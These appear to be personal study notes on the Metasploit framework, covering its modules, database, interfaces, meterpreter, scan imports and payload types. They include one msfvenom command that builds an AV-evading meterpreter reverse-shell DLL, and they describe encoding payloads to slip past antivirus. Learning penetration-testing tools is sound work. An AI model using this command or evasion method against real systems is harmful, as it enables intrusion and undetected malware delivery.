Metasploit is an exploitation framework 
Exploit is a piece of code that takes advantage us a given vulnerability in the target, with the purpose of running a payload that does a indented action of the target. 

Metasploit also have other modules such as auxiliary which provide other capabilities such as port scanning, vulnerability checks, and other features. 
Another module is called post which is used after the exploitation phase, such as steal valuable information. 

Metasploit can both access a local or remote PostgreSQL database for storing and analyzing results.
- Contains information about creds, loot, notes, hosts, services, vulns on host. 
- One way to enrich information in database is using auxiliary modules.
you can interact with the information using the name of the table
	- example of usage https://www.offensive-security.com/metasploit-unleashed/using-databases/
	
User interfaces
msfconsole metasploit command prompt. 
msfd a listens on TCP port 55554, allowing msfconsole access.
msfrpcd control metasploit through XML over RPC on TCP port 55553
Armitage is a GUI that controls metasploit through msfrpcd, is no longer updated  
msfcli 
maspayload convert payload into a stand-alone file
msfencode take a raw payload and encode it to evade strict signature of [[IDS]], [[IPS]] and [[Anti-virus]].  


Metasploit cheat sheet: https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf

Metasploit meterpreter acts as a shell running inside of a exploited process
	- no process created. 
	- works on wind, linux, php, java and mac.
	- communication is encrypted with TLS. 
Meterpreter commands can be seen in the cheat sheet. 
msfmap is a port scanning module that can be loaded.
	load msfmap 
	
Metasploit nmap interaction
	- using db-nmap allows you to invoke [[Nmap]] from metasploit. 
	- Commands are the same as Nmap. 
	
Import data from [[Vulnerability Scanning]]
	- using db_import {filename} 
	allows metasploit to automatically import the information from the file, 
	and added to the host. 
	 Supported scanners file 
	 	- [[Nmap]]
	 	- NeXpose
		- [[Nessus]]
		
		 ^998485
import module from exploit_db 
download the module to the folder 
/root/.msf4/modules/
msfdb reinit to restart the database 
start msfconsole 
search for the new exploit


### Exploits 
#### web_delivery module 
One line python command which can be use to create a reverse_tcp meterpreter connection by opening a url in python and downloading the exploit from the hacker site. 


### MSFVenom 
is a combination of msfpayload and masfencode putting these tools into a single framework instance is allows the user to create a payload which can be used on the target machine, MSFVenom allows the payload to be target to different platforms and formats. another tools msfvenom also comes with is encoded or scrambling of the payload to ensure that the anti virus does not detect the malware. 
shikata_ga_nai is a common encoding type used for scrambling the malware. 
2
usage : 
msfvenom -p windows/meterpreter/reverse_tcp lhost=**IP**  lport=4444 -e x86/shikata_ga_nai -i 10 -f dll > payload.dll


## Payload
The way to identify if it staged or non-staged payload is by the **/** which indicate the type of payload.

### Staged 
Sends the payload in stages, can be less stable

example : windows/meterpreter/reverse_tcp

### non-staged 
Send the full exploit shellcode at once, It larger in size 

example : windows/meterpreter_reverse_tcp